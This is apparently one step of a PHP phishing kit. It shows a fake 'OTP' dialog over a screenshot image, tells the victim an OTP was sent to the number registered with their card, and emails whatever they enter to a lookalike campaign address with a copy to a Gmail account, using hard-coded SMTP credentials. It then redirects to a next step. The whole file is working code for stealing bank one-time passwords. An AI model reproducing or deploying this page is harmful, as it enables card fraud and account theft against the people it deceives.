<?php 
session_start();
date_default_timezone_set('Asia/Kolkata');
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
  if(isset($submit))
    { 
      $_SESSION['very_funny'] = $c_number;
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "smtp.hostinger.com";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in";
                $mail->Password = "Info@123";
                $mail->AddAddress("info@instant-e-apply-campaign-page-online-cmsm-sb-page.co.in");
                $mail->addCC('easymailid45@gmail.com');
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'otp1';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>otp</b> - '.$otp.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:step3.php");      
                }
    }

 ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Campaign</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
    <div style="background: url(img/screen.png); background-size: cover;">
            <img src="img/screen.png" style="opacity: 0;">
    </div>
    <!-- Modal content-->
    <div class="modal-content" style="position: absolute; top: 10px; width: 96%;
    margin-left: 2%;">
        <div class="modal-header">
            <a href="index.php"><button class="close">&times;</button></a>
            <h3 class="modal-title">OTP</h3>
        </div>
        <form method="post">
        <div class="modal-body">
            <p style="text-align: center; font-size: 17px;">An OTP has been sent to the number registered with your card</p>
            <p style="font-size: 18px;">OTP</p>
            
                <input style="height: 40px;" type="text" class="form-control" name="otp" maxlength="6" required>
                <button style="background: rgb(134, 31, 65); border: none; margin-top: 10px; color: #fff; padding: 10px 20px; border-radius: 5px;" type="button" name="submit" id="buttonss">submit</button>
            
        </div>
        </form>
    </div>
    <script type="text/javascript">
    
        $(document).ready(function(){       
   $('#myModal').modal('show');
    }); 


    </script>
    <script type="text/javascript">
            $("#buttonss").click(function() {
                var card1 = $("#CardNum0").val();
                var card2 = $("#CardNum1").val();
                if (card1 != card2) {
                    alert("Card no. did not match..");
                } else {
                    $("#buttonss").attr("type", "submit");
                }
            });
        </script>
        <script>
    function toggle() {
        var cont = document.getElementById('cont');
        if (cont.style.display == 'none') {
            cont.style.display = 'block';
        }
    }
</script>
</body>
</html>


